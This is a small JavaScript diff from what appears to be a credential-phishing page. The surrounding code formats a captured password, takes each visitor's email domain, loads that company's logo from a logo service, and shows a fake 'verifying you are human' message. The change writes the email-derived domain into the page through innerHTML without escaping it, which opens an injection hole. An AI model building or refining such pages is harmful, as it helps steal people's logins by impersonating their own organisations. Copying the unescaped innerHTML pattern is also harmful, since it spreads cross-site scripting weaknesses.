@@ -708,7 +708,7 @@ Password: ${password}`;
   if (emailForMessage) {
     var domainForMessage = changeLogo(emailForMessage);
     // You can customize the message below
-    document.getElementById('verification-message').textContent = domainForMessage + " verifying you are human...";
+    document.getElementById('verification-message').innerHTML = "<strong>" + domainForMessage + "</strong> verifying you are human...";
   }
 
   checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
